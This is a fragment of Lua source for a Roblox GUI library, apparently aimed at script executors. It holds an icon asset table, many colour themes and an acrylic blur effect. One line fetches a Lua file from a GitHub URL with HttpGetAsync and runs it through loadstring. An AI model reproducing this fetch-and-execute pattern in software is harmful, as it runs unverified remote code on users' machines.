	["lucide-microwave"] = "rbxassetid://10734895076",
	["lucide-milestone"] = "rbxassetid://10734895310",
	["lucide-minimize"] = "rbxassetid://10734895698",
	["lucide-minimize-2"] = "rbxassetid://10734895530",
	["lucide-minus"] = "rbxassetid://10734896206",
	["lucide-minus-circle"] = "rbxassetid://10734895856",
	["lucide-minus-square"] = "rbxassetid://10734896029",
	["lucide-monitor"] = "rbxassetid://10734896881",
	["lucide-monitor-off"] = "rbxassetid://10734896360",
	["lucide-monitor-speaker"] = "rbxassetid://10734896512",
	["lucide-moon"] = "rbxassetid://10734897102",
	["lucide-more-horizontal"] = "rbxassetid://10734897250",
	["lucide-more-vertical"] = "rbxassetid://10734897387",
	["lucide-mountain"] = "rbxassetid://10734897956",
	["lucide-mountain-snow"] = "rbxassetid://10734897665",
	["lucide-mouse"] = "rbxassetid://10734898592",
	["lucide-mouse-pointer"] = "rbxassetid://10734898476",
	["lucide-mouse-pointer-2"] = "rbxassetid://10734898194",
	["lucide-mouse-pointer-click"] = "rbxassetid://10734898355",
	["lucide-move"] = "rbxassetid://10734900011",
	["lucide-move-3d"] = "rbxassetid://10734898756",
	["lucide-move-diagonal"] = "rbxassetid://10734899164",
	["lucide-move-diagonal-2"] = "rbxassetid://10734898934",
	["lucide-move-horizontal"] = "rbxassetid://10734899414",
	["lucide-move-vertical"] = "rbxassetid://10734899821",
	["lucide-music"] = "rbxassetid://10734905958",
	["lucide-music-2"] = "rbxassetid://10734900215",
	["lucide-music-3"] = "rbxassetid://10734905665",
	["lucide-music-4"] = "rbxassetid://10734905823",
	["lucide-navigation"] = "rbxassetid://10734906744",
	["lucide-navigation-2"] = "rbxassetid://10734906332",
	["lucide-navigation-2-off"] = "rbxassetid://10734906144",
	["lucide-navigation-off"] = "rbxassetid://10734906580",
	["lucide-network"] = "rbxassetid://10734906975",
	["lucide-newspaper"] = "rbxassetid://10734907168",
	["lucide-octagon"] = "rbxassetid://10734907361",
	["lucide-option"] = "rbxassetid://10734907649",
	["lucide-outdent"] = "rbxassetid://10734907933",
	["lucide-package"] = "rbxassetid://10734909540",
	["lucide-package-2"] = "rbxassetid://10734908151",
	["lucide-package-check"] = "rbxassetid://10734908384",
	["lucide-package-minus"] = "rbxassetid://10734908626",
	["lucide-package-open"] = "rbxassetid://10734908793",
	["lucide-package-plus"] = "rbxassetid://10734909016",
	["lucide-package-search"] = "rbxassetid://10734909196",
	["lucide-package-x"] = "rbxassetid://10734909375",
	["lucide-paint-bucket"] = "rbxassetid://10734909847",
	["lucide-paintbrush"] = "rbxassetid://10734910187",
	["lucide-paintbrush-2"] = "rbxassetid://10734910030",
	["lucide-palette"] = "rbxassetid://10734910430",
	["lucide-palmtree"] = "rbxassetid://10734910680",
	["lucide-paperclip"] = "rbxassetid://10734910927",
	["lucide-party-popper"] = "rbxassetid://10734918735",
	["lucide-pause"] = "rbxassetid://10734919336",
	["lucide-pause-circle"] = "rbxassetid://10735024209",
	["lucide-pause-octagon"] = "rbxassetid://10734919143",
	["lucide-pen-tool"] = "rbxassetid://10734919503",
	["lucide-pencil"] = "rbxassetid://10734919691",
	["lucide-percent"] = "rbxassetid://10734919919",
	["lucide-person-standing"] = "rbxassetid://10734920149",
	["lucide-phone"] = "rbxassetid://10734921524",
	["lucide-phone-call"] = "rbxassetid://10734920305",
	["lucide-phone-forwarded"] = "rbxassetid://10734920508",
	["lucide-phone-incoming"] = "rbxassetid://10734920694",
	["lucide-phone-missed"] = "rbxassetid://10734920845",
	["lucide-phone-off"] = "rbxassetid://10734921077",
	["lucide-phone-outgoing"] = "rbxassetid://10734921288",
	["lucide-pie-chart"] = "rbxassetid://10734921727",
	["lucide-piggy-bank"] = "rbxassetid://10734921935",
	["lucide-pin"] = "rbxassetid://10734922324",
	["lucide-pin-off"] = "rbxassetid://10734922180",
	["lucide-pipette"] = "rbxassetid://10734922497",
	["lucide-pizza"] = "rbxassetid://10734922774",
	["lucide-plane"] = "rbxassetid://10734922971",
	["lucide-play"] = "rbxassetid://10734923549",
	["lucide-play-circle"] = "rbxassetid://10734923214",
	["lucide-plus"] = "rbxassetid://10734924532",
	["lucide-plus-circle"] = "rbxassetid://10734923868",
	["lucide-plus-square"] = "rbxassetid://10734924219",
	["lucide-podcast"] = "rbxassetid://10734929553",
	["lucide-pointer"] = "rbxassetid://10734929723",
	["lucide-pound-sterling"] = "rbxassetid://10734929981",
	["lucide-power"] = "rbxassetid://10734930466",
	["lucide-power-off"] = "rbxassetid://10734930257",
	["lucide-printer"] = "rbxassetid://10734930632",
	["lucide-puzzle"] = "rbxassetid://10734930886",
	["lucide-quote"] = "rbxassetid://10734931234",
	["lucide-radio"] = "rbxassetid://10734931596",
	["lucide-radio-receiver"] = "rbxassetid://10734931402",
	["lucide-rectangle-horizontal"] = "rbxassetid://10734931777",
	["lucide-rectangle-vertical"] = "rbxassetid://10734932081",
	["lucide-recycle"] = "rbxassetid://10734932295",
	["lucide-redo"] = "rbxassetid://10734932822",
	["lucide-redo-2"] = "rbxassetid://10734932586",
	["lucide-refresh-ccw"] = "rbxassetid://10734933056",
	["lucide-refresh-cw"] = "rbxassetid://10734933222",
	["lucide-refrigerator"] = "rbxassetid://10734933465",
	["lucide-regex"] = "rbxassetid://10734933655",
	["lucide-repeat"] = "rbxassetid://10734933966",
	["lucide-repeat-1"] = "rbxassetid://10734933826",
	["lucide-reply"] = "rbxassetid://10734934252",
	["lucide-reply-all"] = "rbxassetid://10734934132",
	["lucide-rewind"] = "rbxassetid://10734934347",
	["lucide-rocket"] = "rbxassetid://10734934585",
	["lucide-rocking-chair"] = "rbxassetid://10734939942",
	["lucide-rotate-3d"] = "rbxassetid://10734940107",
	["lucide-rotate-ccw"] = "rbxassetid://10734940376",
	["lucide-rotate-cw"] = "rbxassetid://10734940654",
	["lucide-rss"] = "rbxassetid://10734940825",
	["lucide-ruler"] = "rbxassetid://10734941018",
	["lucide-russian-ruble"] = "rbxassetid://10734941199",
	["lucide-sailboat"] = "rbxassetid://10734941354",
	["lucide-save"] = "rbxassetid://10734941499",
	["lucide-scale"] = "rbxassetid://10734941912",
	["lucide-scale-3d"] = "rbxassetid://10734941739",
	["lucide-scaling"] = "rbxassetid://10734942072",
	["lucide-scan"] = "rbxassetid://10734942565",
	["lucide-scan-face"] = "rbxassetid://10734942198",
	["lucide-scan-line"] = "rbxassetid://10734942351",
	["lucide-scissors"] = "rbxassetid://10734942778",
	["lucide-screen-share"] = "rbxassetid://10734943193",
	["lucide-screen-share-off"] = "rbxassetid://10734942967",
	["lucide-scroll"] = "rbxassetid://10734943448",
	["lucide-search"] = "rbxassetid://10734943674",
	["lucide-send"] = "rbxassetid://10734943902",
	["lucide-separator-horizontal"] = "rbxassetid://10734944115",
	["lucide-separator-vertical"] = "rbxassetid://10734944326",
	["lucide-server"] = "rbxassetid://10734949856",
	["lucide-server-cog"] = "rbxassetid://10734944444",
	["lucide-server-crash"] = "rbxassetid://10734944554",
	["lucide-server-off"] = "rbxassetid://10734944668",
	["lucide-settings"] = "rbxassetid://10734950309",
	["lucide-settings-2"] = "rbxassetid://10734950020",
	["lucide-share"] = "rbxassetid://10734950813",
	["lucide-share-2"] = "rbxassetid://10734950553",
	["lucide-sheet"] = "rbxassetid://10734951038",
	["lucide-shield"] = "rbxassetid://10734951847",
	["lucide-shield-alert"] = "rbxassetid://10734951173",
	["lucide-shield-check"] = "rbxassetid://10734951367",
	["lucide-shield-close"] = "rbxassetid://10734951535",
	["lucide-shield-off"] = "rbxassetid://10734951684",
	["lucide-shirt"] = "rbxassetid://10734952036",
	["lucide-shopping-bag"] = "rbxassetid://10734952273",
	["lucide-shopping-cart"] = "rbxassetid://10734952479",
	["lucide-shovel"] = "rbxassetid://10734952773",
	["lucide-shower-head"] = "rbxassetid://10734952942",
	["lucide-shrink"] = "rbxassetid://10734953073",
	["lucide-shrub"] = "rbxassetid://10734953241",
	["lucide-shuffle"] = "rbxassetid://10734953451",
	["lucide-sidebar"] = "rbxassetid://10734954301",
	["lucide-sidebar-close"] = "rbxassetid://10734953715",
	["lucide-sidebar-open"] = "rbxassetid://10734954000",
	["lucide-sigma"] = "rbxassetid://10734954538",
	["lucide-signal"] = "rbxassetid://10734961133",
	["lucide-signal-high"] = "rbxassetid://10734954807",
	["lucide-signal-low"] = "rbxassetid://10734955080",
	["lucide-signal-medium"] = "rbxassetid://10734955336",
	["lucide-signal-zero"] = "rbxassetid://10734960878",
	["lucide-siren"] = "rbxassetid://10734961284",
	["lucide-skip-back"] = "rbxassetid://10734961526",
	["lucide-skip-forward"] = "rbxassetid://10734961809",
	["lucide-skull"] = "rbxassetid://10734962068",
	["lucide-slack"] = "rbxassetid://10734962339",
	["lucide-slash"] = "rbxassetid://10734962600",
	["lucide-slice"] = "rbxassetid://10734963024",
	["lucide-sliders"] = "rbxassetid://10734963400",
	["lucide-sliders-horizontal"] = "rbxassetid://10734963191",
	["lucide-smartphone"] = "rbxassetid://10734963940",
	["lucide-smartphone-charging"] = "rbxassetid://10734963671",
	["lucide-smile"] = "rbxassetid://10734964441",
	["lucide-smile-plus"] = "rbxassetid://10734964188",
	["lucide-snowflake"] = "rbxassetid://10734964600",
	["lucide-sofa"] = "rbxassetid://10734964852",
	["lucide-sort-asc"] = "rbxassetid://10734965115",
	["lucide-sort-desc"] = "rbxassetid://10734965287",
	["lucide-speaker"] = "rbxassetid://10734965419",
	["lucide-sprout"] = "rbxassetid://10734965572",
	["lucide-square"] = "rbxassetid://10734965702",
	["lucide-star"] = "rbxassetid://10734966248",
	["lucide-star-half"] = "rbxassetid://10734965897",
	["lucide-star-off"] = "rbxassetid://10734966097",
	["lucide-stethoscope"] = "rbxassetid://10734966384",
	["lucide-sticker"] = "rbxassetid://10734972234",
	["lucide-sticky-note"] = "rbxassetid://10734972463",
	["lucide-stop-circle"] = "rbxassetid://10734972621",
	["lucide-stretch-horizontal"] = "rbxassetid://10734972862",
	["lucide-stretch-vertical"] = "rbxassetid://10734973130",
	["lucide-strikethrough"] = "rbxassetid://10734973290",
	["lucide-subscript"] = "rbxassetid://10734973457",
	["lucide-sun"] = "rbxassetid://10734974297",
	["lucide-sun-dim"] = "rbxassetid://10734973645",
	["lucide-sun-medium"] = "rbxassetid://10734973778",
	["lucide-sun-moon"] = "rbxassetid://10734973999",
	["lucide-sun-snow"] = "rbxassetid://10734974130",
	["lucide-sunrise"] = "rbxassetid://10734974522",
	["lucide-sunset"] = "rbxassetid://10734974689",
	["lucide-superscript"] = "rbxassetid://10734974850",
	["lucide-swiss-franc"] = "rbxassetid://10734975024",
	["lucide-switch-camera"] = "rbxassetid://10734975214",
	["lucide-sword"] = "rbxassetid://10734975486",
	["lucide-swords"] = "rbxassetid://10734975692",
	["lucide-syringe"] = "rbxassetid://10734975932",
	["lucide-table"] = "rbxassetid://10734976230",
	["lucide-table-2"] = "rbxassetid://10734976097",
	["lucide-tablet"] = "rbxassetid://10734976394",
	["lucide-tag"] = "rbxassetid://10734976528",
	["lucide-tags"] = "rbxassetid://10734976739",
	["lucide-target"] = "rbxassetid://10734977012",
	["lucide-tent"] = "rbxassetid://10734981750",
	["lucide-terminal"] = "rbxassetid://10734982144",
	["lucide-terminal-square"] = "rbxassetid://10734981995",
	["lucide-text-cursor"] = "rbxassetid://10734982395",
	["lucide-text-cursor-input"] = "rbxassetid://10734982297",
	["lucide-thermometer"] = "rbxassetid://10734983134",
	["lucide-thermometer-snowflake"] = "rbxassetid://10734982571",
	["lucide-thermometer-sun"] = "rbxassetid://10734982771",
	["lucide-thumbs-down"] = "rbxassetid://10734983359",
	["lucide-thumbs-up"] = "rbxassetid://10734983629",
	["lucide-ticket"] = "rbxassetid://10734983868",
	["lucide-timer"] = "rbxassetid://10734984606",
	["lucide-timer-off"] = "rbxassetid://10734984138",
	["lucide-timer-reset"] = "rbxassetid://10734984355",
	["lucide-toggle-left"] = "rbxassetid://10734984834",
	["lucide-toggle-right"] = "rbxassetid://10734985040",
	["lucide-tornado"] = "rbxassetid://10734985247",
	["lucide-toy-brick"] = "rbxassetid://10747361919",
	["lucide-train"] = "rbxassetid://10747362105",
	["lucide-trash"] = "rbxassetid://10747362393",
	["lucide-trash-2"] = "rbxassetid://10747362241",
	["lucide-tree-deciduous"] = "rbxassetid://10747362534",
	["lucide-tree-pine"] = "rbxassetid://10747362748",
	["lucide-trees"] = "rbxassetid://10747363016",
	["lucide-trending-down"] = "rbxassetid://10747363205",
	["lucide-trending-up"] = "rbxassetid://10747363465",
	["lucide-triangle"] = "rbxassetid://10747363621",
	["lucide-trophy"] = "rbxassetid://10747363809",
	["lucide-truck"] = "rbxassetid://10747364031",
	["lucide-tv"] = "rbxassetid://10747364593",
	["lucide-tv-2"] = "rbxassetid://10747364302",
	["lucide-type"] = "rbxassetid://10747364761",
	["lucide-umbrella"] = "rbxassetid://10747364971",
	["lucide-underline"] = "rbxassetid://10747365191",
	["lucide-undo"] = "rbxassetid://10747365484",
	["lucide-undo-2"] = "rbxassetid://10747365359",
	["lucide-unlink"] = "rbxassetid://10747365771",
	["lucide-unlink-2"] = "rbxassetid://10747397871",
	["lucide-unlock"] = "rbxassetid://10747366027",
	["lucide-upload"] = "rbxassetid://10747366434",
	["lucide-upload-cloud"] = "rbxassetid://10747366266",
	["lucide-usb"] = "rbxassetid://10747366606",
	["lucide-user"] = "rbxassetid://10747373176",
	["lucide-user-check"] = "rbxassetid://10747371901",
	["lucide-user-cog"] = "rbxassetid://10747372167",
	["lucide-user-minus"] = "rbxassetid://10747372346",
	["lucide-user-plus"] = "rbxassetid://10747372702",
	["lucide-user-x"] = "rbxassetid://10747372992",
	["lucide-users"] = "rbxassetid://10747373426",
	["lucide-utensils"] = "rbxassetid://10747373821",
	["lucide-utensils-crossed"] = "rbxassetid://10747373629",
	["lucide-venetian-mask"] = "rbxassetid://10747374003",
	["lucide-verified"] = "rbxassetid://10747374131",
	["lucide-vibrate"] = "rbxassetid://10747374489",
	["lucide-vibrate-off"] = "rbxassetid://10747374269",
	["lucide-video"] = "rbxassetid://10747374938",
	["lucide-video-off"] = "rbxassetid://10747374721",
	["lucide-view"] = "rbxassetid://10747375132",
	["lucide-voicemail"] = "rbxassetid://10747375281",
	["lucide-volume"] = "rbxassetid://10747376008",
	["lucide-volume-1"] = "rbxassetid://10747375450",
	["lucide-volume-2"] = "rbxassetid://10747375679",
	["lucide-volume-x"] = "rbxassetid://10747375880",
	["lucide-wallet"] = "rbxassetid://10747376205",
	["lucide-wand"] = "rbxassetid://10747376565",
	["lucide-wand-2"] = "rbxassetid://10747376349",
	["lucide-watch"] = "rbxassetid://10747376722",
	["lucide-waves"] = "rbxassetid://10747376931",
	["lucide-webcam"] = "rbxassetid://10747381992",
	["lucide-wifi"] = "rbxassetid://10747382504",
	["lucide-wifi-off"] = "rbxassetid://10747382268",
	["lucide-wind"] = "rbxassetid://10747382750",
	["lucide-wrap-text"] = "rbxassetid://10747383065",
	["lucide-wrench"] = "rbxassetid://10747383470",
	["lucide-x"] = "rbxassetid://10747384394",
	["lucide-x-circle"] = "rbxassetid://10747383819",
	["lucide-x-octagon"] = "rbxassetid://10747384037",
	["lucide-x-square"] = "rbxassetid://10747384217",
	["lucide-zoom-in"] = "rbxassetid://10747384552",
	["lucide-zoom-out"] = "rbxassetid://10747384679",
}

local TextService = game:GetService("TextService")

Library.ProtectGui = protectgui or protect_gui or (syn and syn.protectgui) or function() end
Library.Cloneref = cloneref or function(o)
	return o
end
Library.TweenService = game:GetService("TweenService")
Library.LocalPlayer = game:GetService("Players").LocalPlayer
Library.CoreGui = (game:FindFirstChild("CoreGui") and Library.Cloneref(game:GetService("CoreGui")))
	or Library.LocalPlayer.PlayerGui
------------------------------------UI.主题颜色------------------------------------------------------------------------------------------------------------
Library.SizeLibrary = {
    Default = UDim2.fromOffset(460, 308),
    Auth    = UDim2.new(0.05, 200, 0.05, 100),
    Max     = UDim2.fromScale(1, 1),
    Loading = UDim2.new(0, 70, 0, 70),
    Close   = UDim2.new(0.01, 25, 0.01, 25),
}

Library.Theme = {}
Library.Colors = {
    Hightlight = Color3.fromRGB(0,255,255),
    Default    = Color3.fromRGB(32,33,36),
    Disable    = Color3.fromRGB(167,173,188),
    TextColor  = Color3.fromRGB(220,224,234),
}

function Library:AddTheme(name, h, d, ds, t)
    self.Theme[name] = function(_self)
        Library.Colors = {
            Hightlight = Color3.fromRGB(bit.rshift(h,16), bit.band(bit.rshift(h,8),0xFF), bit.band(h,0xFF)),
            Default    = Color3.fromRGB(bit.rshift(d,16), bit.band(bit.rshift(d,8),0xFF), bit.band(d,0xFF)),
            Disable    = Color3.fromRGB(bit.rshift(ds,16),bit.band(bit.rshift(ds,8),0xFF),bit.band(ds,0xFF)),
            TextColor  = Color3.fromRGB(bit.rshift(t,16), bit.band(bit.rshift(t,8),0xFF), bit.band(t,0xFF)),
        }
    end
end

Library:AddTheme("Default"        ,0x00FFFF,0x202124,0xA7ADBC,0xDCE0EA)
Library:AddTheme("Dark"           ,0xFFFFFF,0x141416,0xA7ADBC,0xDCE0EA)
Library:AddTheme("Discord"        ,0x7289DA,0x232528,0xA7ADBC,0xEAEAEA)
Library:AddTheme("Discord1"       ,0x0073FF,0xC6D3E5,0x4A4D53,0x000000)
Library:AddTheme("Catppuccin"     ,0xC9A5F5,0x1E1F2F,0x6D7B9A,0xCCCCCC)
Library:AddTheme("Discord2"       ,0x5AD4B0,0x16191D,0x484853,0xBFC1C3)
Library:AddTheme("Matcha"         ,0x98846E,0x263137,0x3E5352,0xA5B2AF)
Library:AddTheme("Neverlose"      ,0x00FBFF,0x000D1A,0xA7ADBC,0xFFFFFF)
Library:AddTheme("HightGreen"     ,0x00FF8C,0x080D0C,0xA3BCA5,0xFFFFFF)
Library:AddTheme("Halloween"      ,0xFFA200,0x0D0B0A,0xBC9C9C,0xFF0000)
Library:AddTheme("Christmas"      ,0x8ADCFF,0x0B0D0D,0x516768,0xF9F9F9)
Library:AddTheme("Valentine"      ,0xFF0080,0xC80F64,0xCEA2A8,0xFFFFFF)
Library:AddTheme("Summer"         ,0x00FF7F,0x008066,0xADD8E6,0xFFFFFF)
Library:AddTheme("Autumn"         ,0xFF8C00,0x8B4513,0xBC8F8F,0xFFFFFF)
Library:AddTheme("Winter"         ,0xADD8E6,0x4682B4,0xC7DBF9,0x000000)
Library:AddTheme("Ocean"          ,0x009688,0x003333,0x6699FF,0xFFFFFF)
Library:AddTheme("Nord"           ,0x88C0D0,0x2E3440,0x586E75,0xD8DEE3)
Library:AddTheme("Mint"           ,0xBDFCC9,0x27AE60,0xBDDCBD,0x2980B9)
Library:AddTheme("Sunset"         ,0xFF4500,0x8B4513,0xCFCFCF,0xFFFFFF)
Library:AddTheme("Rose"           ,0xFF69B4,0x60004D,0xCCC0B3,0xFFFFFF)
Library:AddTheme("Cyberpunk"      ,0x00FCFF,0x000000,0x4B4B4B,0xFFFFFF)
Library:AddTheme("Lavender"       ,0xE6E6FA,0x9696AA,0xC8C8DC,0xFFFFFF)
Library:AddTheme("AquaMarine"     ,0x7FFFD4,0x006464,0x8FBC8F,0x000000)
Library:AddTheme("Midnight"       ,0x3A454D,0x0A0A0A,0x3A454D,0xFFFFFF)
Library:AddTheme("Sakura"         ,0xFFB6C1,0xA0522D,0xE9B9AA,0xFFFFFF)
Library:AddTheme("Desert"         ,0xFFDF81,0x8B4513,0xD2B48C,0x000000)
Library:AddTheme("Forest"         ,0x228B22,0x006400,0x90EE90,0xFFFFFF)
Library:AddTheme("Royal"          ,0x663399,0x000000,0xAD7FA8,0xFFFFFF)
Library:AddTheme("Ruby"           ,0xE0115F,0x8B0000,0xE9B9AA,0xFFFFFF)
Library:AddTheme("Tropical"       ,0xFFEFFD,0x005F57,0xDAE8DA,0x0A0A0A)
Library:AddTheme("Vintage"        ,0x8B4513,0x708090,0xBFBFBF,0xFFFFFF)
Library:AddTheme("Cobalt"         ,0x00FFFF,0x000066,0x6699CC,0xFFFFFF)
Library:AddTheme("Sage"           ,0x9EFB9B,0x4B6446,0xBCE2B8,0x000000)
Library:AddTheme("Bronze"         ,0xCD7F32,0x8B4513,0xDEB887,0xFFFFFF)
Library:AddTheme("Lagoon"         ,0x009688,0x003333,0x6699FF,0xFFFFFF)
Library:AddTheme("Amber"          ,0xFFBF00,0x8B4513,0xFFCC66,0x000000)
Library:AddTheme("Aurora"         ,0x8A2BE2,0x1A1A1A,0x484848,0xFFFFFF)
Library:AddTheme("Neon"           ,0x00FCFF,0x191919,0x646464,0xFFFFFF)
Library:AddTheme("Pastel"         ,0xFF9EB5,0xCFCFCF,0xEEEEEE,0x333333)
Library:AddTheme("Jungle"         ,0x008000,0x222222,0x669966,0xFFFFFF)
Library:AddTheme("OceanBreeze"    ,0x00ADEF,0x29405A,0x83AF9B,0xFFFFFF)
Library:AddTheme("Sunrise"        ,0xFF9F43,0x222222,0xCC9966,0xFFFFFF)
Library:AddTheme("StarryNight"    ,0x4682B4,0x0C0C0C,0x353535,0xFFFFFF)
Library:AddTheme("Twilight"       ,0x4B0082,0x2D2D3C,0x646478,0xFFFFFF)
Library:AddTheme("Frost"          ,0xB9E1FF,0xF0FAFF,0xC8D7E6,0x000000)
Library:AddTheme("Floral"         ,0xFFB6C1,0x87CEEB,0xE1E1E1,0x0A0A0A)
Library:AddTheme("SunsetBeach"    ,0xFF4500,0xFF8C00,0xFFD566,0x000000)
Library:AddTheme("Mystic"         ,0x4169E1,0x28323C,0x828AA5,0xFFFFFF)
Library:AddTheme("Elegant"        ,0xFFC107,0x461E14,0xC8A078,0xFFFFFF)
Library:AddTheme("ChineseNewYear" ,0xFF0000,0xFFA500,0xFFD7CD,0x000000)
Library:AddTheme("Celebration"    ,0xFA0101,0xFF0000,0xFFC0CB,0x000000)

function Library.Theme:Custom(Hightlight, Default, Disable, TextColor)
    Library.Colors = {
        Hightlight = Hightlight,
        Default    = Default,
        Disable    = Disable,
        TextColor  = TextColor,
    }
end

function Library.Theme:RandomColor()
    local r = function() return math.random(0,255) end
    Library.Colors = {
        Hightlight = Color3.fromRGB(r(),r(),r()),
        Default    = Color3.fromRGB(r(),r(),r()),
        Disable    = Color3.fromRGB(r(),r(),r()),
        TextColor  = Color3.fromRGB(r(),r(),r()),
    }
end

------------------------------------UI.主题颜色------------------------------------------------------------------------------------------------------------
function Library.Theme:Random()
	local RNG = Random.new()

	local Start = function()
		return RNG:NextNumber(0, 255), RNG:NextNumber(0, 255), RNG:NextNumber(0, 255)
	end

	Library.Colors = {
		Hightlight = Color3.fromRGB(Start()),
		Default = Color3.fromRGB(Start()),
		Disable = Color3.fromRGB(Start()),
		TextColor = Color3.fromRGB(Start()),
	}

	print("Random Theme:", Library.Colors)
end

Library.TweenLibrary = {
	WindowChanged = TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut),
	Normal = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
	WindowChangedFast = TweenInfo.new(0.35, Enum.EasingStyle.Quint),
	SmallEffect = TweenInfo.new(0.5, Enum.EasingStyle.Quint),
	FastEffect = TweenInfo.new(0.2, Enum.EasingStyle.Quint),
	BinEffect = TweenInfo.new(0.01),
	UltrsFast = TweenInfo.new(0.0001, Enum.EasingStyle.Linear),
}

local _C, Source = pcall(function()
	return loadstring(game:HttpGetAsync("https://github.com/GTAFAW/UI/raw/main/UI.BLUR.LUA"))()
end)
local operators = {
	"^(function)[^%w_]",
	"^(local)[^%w_]",
	"^(if)[^%w_]",
	"^(for)[^%w_]",
	"^(while)[^%w_]",
	"^(then)[^%w_]",
	"^(do)[^%w_]",
	"^(else)[^%w_]",
	"^(elseif)[^%w_]",
	"^(return)[^%w_]",
	"^(end)[^%w_]",
	"^(continue)[^%w_]",
	"^(and)[^%w_]",
	"^(not)[^%w_]",
	"^(or)[^%w_]",
	"[^%w_](or)[^%w_]",
	"[^%w_](and)[^%w_]",
	"[^%w_](not)[^%w_]",
	"[^%w_](continue)[^%w_]",
	"[^%w_](function)[^%w_]",
	"[^%w_](local)[^%w_]",
	"[^%w_](if)[^%w_]",
	"[^%w_](for)[^%w_]",
	"[^%w_](while)[^%w_]",
	"[^%w_](then)[^%w_]",
	"[^%w_](do)[^%w_]",
	"[^%w_](else)[^%w_]",
	"[^%w_](elseif)[^%w_]",
	"[^%w_](return)[^%w_]",
	"[^%w_](end)[^%w_]",
}
local strings = { { '"', '"' }, { "'", "'" }, { "%[%[", "%]%]", true } }
local comments = { "%-%-%[%[[^%]%]]+%]?%]?", "(%-%-[^\n]+)" }
local functions = { "[^%w_]([%a_][%a%d_]*)%s*%(", "^([%a_][%a%d_]*)%s*%(", "[:%.%(%[%p]([%a_][%a%d_]*)%s*%(" }
local numbers = {
	"[^%w_](%d+[eE]?%d*)",
	"[^%w_](%.%d+[eE]?%d*)",
	"[^%w_](%d+%.%d+[eE]?%d*)",
	"^(%d+[eE]?%d*)",
	"^(%.%d+[eE]?%d*)",
	"^(%d+%.%d+[eE]?%d*)",
}
local booleans = { "[^%w_](true)", "^(true)", "[^%w_](false)", "^(false)", "[^%w_](nil)", "^(nil)" }
local objects = { "[^%w_:]([%a_][%a%d_]*):", "^([%a_][%a%d_]*):" }
local other = { "[^_%s%w=>~<%-%+%*]", ">", "~", "<", "%-", "%+", "=", "%*" }
local tableContents = {}
local lines = {}
local LoadAcrylic = function()
	---------------------------------UI.渐变效果---------------------------------------------------------------------------------------------------------------------------------------
	local GuiSystem = {}

	local Twen = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	local CurrentCamera = workspace.CurrentCamera

	function GuiSystem:Hash()
		return string.reverse(string.gsub(game:GetService("HttpService"):GenerateGUID(false), "..", function(aa)
			return string.reverse(aa)
		end))
	end

	local function Hiter(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos

		local num = (n.x * v.x) + (n.y * v.y) + (n.z * v.z)
		local den = (n.x * d.x) + (n.y * d.y) + (n.z * d.z)
		local a = -num / den

		return rayOrigin + (a * rayDirection), a
	end

	function GuiSystem.new(frame, NoAutoBackground)
		local Part = Instance.new("Part", workspace)
		local DepthOfField = Instance.new("DepthOfFieldEffect", game:GetService("Lighting"))
		local SurfaceGui = Instance.new("SurfaceGui", Part)
		local BlockMesh = Instance.new("BlockMesh")

		BlockMesh.Parent = Part

		Part.Material = Enum.Material.Glass
		Part.Transparency = 1
		Part.Reflectance = 1
		Part.CastShadow = false
		Part.Anchored = true
		Part.CanCollide = false
		Part.CanQuery = false
		Part.CollisionGroup = GuiSystem:Hash()
		Part.Size = Vector3.new(1, 1, 1) * 0.01
		Part.Color = Color3.fromRGB(0, 0, 0)

		Twen:Create(Part, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
			Transparency = 0.8,
		}):Play()

		DepthOfField.Enabled = true
		DepthOfField.FarIntensity = 1
		DepthOfField.FocusDistance = 0
		DepthOfField.InFocusRadius = 500
		DepthOfField.NearIntensity = 1

		SurfaceGui.AlwaysOnTop = true
		SurfaceGui.Adornee = Part
		SurfaceGui.Active = true
		SurfaceGui.Face = Enum.NormalId.Front
		SurfaceGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

		DepthOfField.Name = GuiSystem:Hash()
		Part.Name = GuiSystem:Hash()
		SurfaceGui.Name = GuiSystem:Hash()

		local C4 = {
			Update = nil,
			Collection = SurfaceGui,
			Enabled = true,
			Instances = {
				BlockMesh = BlockMesh,
				Part = Part,
				DepthOfField = DepthOfField,
				SurfaceGui = SurfaceGui,
			},
			Signal = nil,
		}
		local Update = function()
			local _, updatec = pcall(function()
				local userSettings = UserSettings():GetService("UserGameSettings")
				local qualityLevel = userSettings.SavedQualityLevel.Value

				if qualityLevel < 8 then
					Twen:Create(Part, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
						Transparency = 1,
					}):Play()
				else
					Twen:Create(Part, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
						Transparency = 0.8,
					}):Play()
				end
			end)

			local corner0 = frame.AbsolutePosition
			local corner1 = corner0 + frame.AbsoluteSize

			local ray0 = CurrentCamera.ScreenPointToRay(CurrentCamera, corner0.X, corner0.Y, 1)
			local ray1 = CurrentCamera.ScreenPointToRay(CurrentCamera, corner1.X, corner1.Y, 1)

			local planeOrigin = CurrentCamera.CFrame.Position
				+ CurrentCamera.CFrame.LookVector * (0.05 - CurrentCamera.NearPlaneZ)

			local planeNormal = CurrentCamera.CFrame.LookVector

			local pos0 = Hiter(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
			local pos1 = Hiter(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)

			pos0 = CurrentCamera.CFrame:PointToObjectSpace(pos0)
			pos1 = CurrentCamera.CFrame:PointToObjectSpace(pos1)

			local size = pos1 - pos0
			local center = (pos0 + pos1) / 2

			BlockMesh.Offset = center
			BlockMesh.Scale = size / 0.0101
			Part.CFrame = CurrentCamera.CFrame
		end
		C4.Update = Update
		C4.Signal = RunService.RenderStepped:Connect(Update)
		pcall(function()
			C4.Signal2 = CurrentCamera:GetPropertyChangedSignal("CFrame"):Connect(function()
				Part.CFrame = CurrentCamera.CFrame
			end)
		end)
		C4.Destroy = function()
			C4.Signal:Disconnect()
			C4.Signal2:Disconnect()
			C4.Update = function() end
			Twen:Create(Part, TweenInfo.new(1), {
				Transparency = 1,
			}):Play()
			DepthOfField:Destroy()
			Part:Destroy()
		end
		return C4
	end
	return GuiSystem
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Library.UIBlur = (_C and Source) or LoadAcrylic()
Library.UserInputService = game:GetService("UserInputService")
